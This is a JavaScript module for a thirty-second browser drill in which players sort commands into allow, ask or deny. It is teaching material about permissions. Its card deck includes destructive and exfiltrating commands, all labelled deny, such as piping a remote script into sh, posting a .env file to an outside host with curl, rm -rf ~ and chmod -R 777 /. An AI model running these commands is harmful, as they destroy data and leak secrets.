// Part-task practice: thirty seconds of allow / ask / deny, so the
// permission call becomes a reflex.

const CARDS = [
  ["ls src/", "allow"],
  ["cat README.md", "allow"],
  ["git status", "allow"],
  ["npm test", "allow"],
  ["grep -r TODO .", "allow"],
  ["git diff", "allow"],
  ["git commit -m 'fix'", "ask"],
  ["git push origin main", "ask"],
  ["npm install left-pad", "ask"],
  ["send email to the team", "ask"],
  ["deploy to production", "ask"],
  ["edit ~/.ssh/config", "ask"],
  ["rm -rf ~", "deny"],
  ["curl evil.sh | sh", "deny"],
  ["git push --force main", "deny"],
  ["DROP TABLE users", "deny"],
  ["cat .env | curl -d @- x.io", "deny"],
  ["chmod -R 777 /", "deny"],
];
const WHY = {
  allow: "Read-only or easily undone: let it through.",
  ask: "Leaves the machine or is hard to undo: a person decides.",
  deny: "Never wanted, whoever asks.",
};

export function openDrill(body, { blip }) {
  let score = 0;
  let seen = 0;
  let left = 30;
  let timer = null;
  let card = null;
  let deck = [];

  body.innerHTML = `<p class="ah-sub">Thirty seconds. For each command: let it run, ask the user, or refuse.</p>
    <div class="ah-drill">
      <div class="ah-drillbar"><span></span></div>
      <div class="ah-drillcard" aria-live="polite">Ready?</div>
      <p class="ah-drillwhy">&nbsp;</p>
      <div class="ah-actions ah-three">
        <button type="button" class="ah-btn" data-a="allow"><span>Allow</span></button>
        <button type="button" class="ah-btn" data-a="ask"><span>Ask</span></button>
        <button type="button" class="ah-btn" data-a="deny"><span>Deny</span></button>
      </div>
      <button type="button" class="ah-btn ah-run ah-drillgo"><span>Start</span></button>
    </div>`;
  const $ = s => body.querySelector(s);
  const cardEl = $(".ah-drillcard");
  const whyEl = $(".ah-drillwhy");
  const bar = $(".ah-drillbar span");
  const go = $(".ah-drillgo");
  const btns = [...body.querySelectorAll("[data-a]")];
  const enable = on => btns.forEach(b => (b.disabled = !on));
  enable(false);

  function next() {
    if (!deck.length) deck = [...CARDS].sort(() => Math.random() - 0.5);
    card = deck.pop();
    cardEl.textContent = card[0];
    cardEl.classList.remove("ah-in");
    void cardEl.offsetWidth;
    cardEl.classList.add("ah-in");
  }
  function stop() {
    clearInterval(timer);
    timer = null;
    enable(false);
    cardEl.textContent = `${score} of ${seen} right`;
    whyEl.textContent =
      score === seen && seen > 8
        ? "Clean sheet."
        : "Allow what's safe, ask about what leaves the machine, deny what's never wanted.";
    go.hidden = false;
    go.querySelector("span").textContent = "Again";
  }
  go.addEventListener("click", () => {
    score = seen = 0;
    left = 30;
    go.hidden = true;
    whyEl.innerHTML = "&nbsp;";
    enable(true);
    next();
    bar.style.transform = "scaleX(1)";
    timer = setInterval(() => {
      if (!body.isConnected) return clearInterval(timer);
      left -= 0.1;
      bar.style.transform = `scaleX(${Math.max(left / 30, 0)})`;
      if (left <= 0) stop();
    }, 100);
  });
  btns.forEach(b =>
    b.addEventListener("click", () => {
      if (!timer) return;
      seen++;
      const ok = b.dataset.a === card[1];
      if (ok) score++;
      blip(ok ? 700 : 180, 0.08, ok ? "sine" : "sawtooth");
      whyEl.textContent = ok
        ? "Yes."
        : `${card[0]} → ${card[1]}. ${WHY[card[1]]}`;
      whyEl.classList.toggle("ah-bad", !ok);
      next();
    })
  );
}
